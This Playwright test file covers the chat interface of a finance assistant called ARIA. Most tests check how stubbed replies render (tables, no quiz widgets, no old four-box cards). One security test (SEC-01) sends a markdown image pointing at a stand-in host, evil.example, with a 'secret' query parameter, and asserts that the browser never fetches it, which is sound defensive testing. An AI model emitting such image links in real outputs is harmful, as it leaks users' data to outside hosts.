import { test, expect } from '@playwright/test'

// The answer is served by a stub so only the rendering is under test (no model, no quota).
const reply = [
  'A SIP invests a fixed amount every month.',
  '',
  '| Monthly amount | Years | Assumed return | Estimated value |',
  '|---|---|---|---|',
  '| ₹5,000 | 10 | 12% | ₹11.6 lakh |',
  '',
  '**Cognitive:** this label must not appear as a heading',
].join('\n')

for (const question of ['What is a SIP?', 'Explain compound interest', 'what does NAV mean', 'define asset allocation', 'tell me about debt funds']) {
  test(`"${question}": answer shown as text and a table, no quiz, no empty section headings`, async ({ page }) => {
    await page.addInitScript(() => {
      for (const name of ['SpeechRecognition', 'webkitSpeechRecognition']) Object.defineProperty(window, name, { value: undefined }) // never listen to the real microphone
      localStorage.setItem('aria_owner_id', 'e2e-style-owner')
    })
    await page.route('**/api/chat', (route) => route.request().method() === 'POST'
      ? route.fulfill({ json: { domain: 'tutor', query: question, response: reply } })
      : route.continue())
    await page.goto('/#/chat')
    await page.getByRole('button', { name: 'Leave meeting' }).click({ timeout: 8000 }).catch(() => {}) // the app opens in the Live meeting
    await expect(page.getByLabel('Message ARIA')).toBeVisible()
    await page.getByLabel('Message ARIA').fill(question)
    await page.getByLabel('Message ARIA').press('Enter')
    await expect(page.locator('.bubble-user', { hasText: question })).toBeVisible()
    await expect(page.locator('table')).toBeVisible()
    await expect(page.locator('td', { hasText: '₹11.6 lakh' })).toBeVisible()
    await expect(page.getByText('Submit', { exact: false })).toHaveCount(0)
    await expect(page.locator('.quiz-widget, [class*="quiz"]')).toHaveCount(0)
    await expect(page.locator('.response-card-label', { hasText: /^(Cognitive|Functional|Causal)$/ })).toHaveCount(0)
    await expect(page.getByRole('group', { name: 'Message actions' })).toBeVisible()
  })
}

// The old four-box format ("Insight: ... Analysis: ... Recommendation: ... Risk: ...") must never be drawn as coloured cards.
for (const ui of ['v2']) {
  test(`${ui}: labelled Insight/Analysis/Recommendation/Risk text is shown as plain Markdown, no cards`, async ({ page }) => {
    await page.addInitScript((u) => { for (const n of ['SpeechRecognition', 'webkitSpeechRecognition']) Object.defineProperty(window, n, { value: undefined }); localStorage.setItem('aria_owner_id', 'plain-' + Date.now()); localStorage.setItem('aria_version', u) }, ui)
    await page.route('**/api/chat', (route) => route.request().method() === 'POST' ? route.fulfill({ json: { domain: 'equity_research', query: 'itc', response: 'Insight: ITC trades at ₹265.\nAnalysis:\n- Revenue is up\n- Margins are down\nRecommendation: Watch the next results.\nRisk: Earnings are volatile.' } }) : route.continue())
    await page.goto('/#/chat')
    await page.getByRole('button', { name: 'Leave meeting' }).click({ timeout: 8000 }).catch(() => {})
    await page.getByLabel('Message ARIA').fill('itc')
    await page.getByLabel('Message ARIA').press('Enter')
    await expect(page.getByText('ITC trades at ₹265.')).toBeVisible()
    await expect(page.locator('.response-card')).toHaveCount(0)
    await expect(page.locator('.response-card-label')).toHaveCount(0)
    await expect(page.getByText('Insight', { exact: false })).toHaveCount(0)
    await expect(page.getByText('Margins are down')).toBeVisible()
  })
}

// SEC-01: a model-written remote image must not be fetched by the browser.
test('markdown images are not rendered', async ({ page }) => {
  await page.addInitScript(() => { for (const n of ['SpeechRecognition', 'webkitSpeechRecognition']) Object.defineProperty(window, n, { value: undefined }); localStorage.setItem('aria_owner_id', 'img-' + Date.now()); localStorage.setItem('aria_version', 'v2') })
  const fetched: string[] = []
  await page.route('https://evil.example/**', (route) => { fetched.push(route.request().url()); return route.abort() })
  await page.route('**/api/chat', (route) => route.request().method() === 'POST' ? route.fulfill({ json: { domain: 'general', query: 'x', response: 'Here is the answer.\n\n![tracking](https://evil.example/pixel.png?d=secret)' } }) : route.continue())
  await page.goto('/#/chat')
  await page.getByRole('button', { name: 'Leave meeting' }).click({ timeout: 8000 }).catch(() => {})
  await page.getByLabel('Message ARIA').fill('x')
  await page.getByLabel('Message ARIA').press('Enter')
  await expect(page.getByText('Here is the answer.')).toBeVisible()
  await page.waitForTimeout(500)
  expect(await page.locator('img[src*="evil.example"]').count()).toBe(0)
  expect(fetched).toEqual([])
})
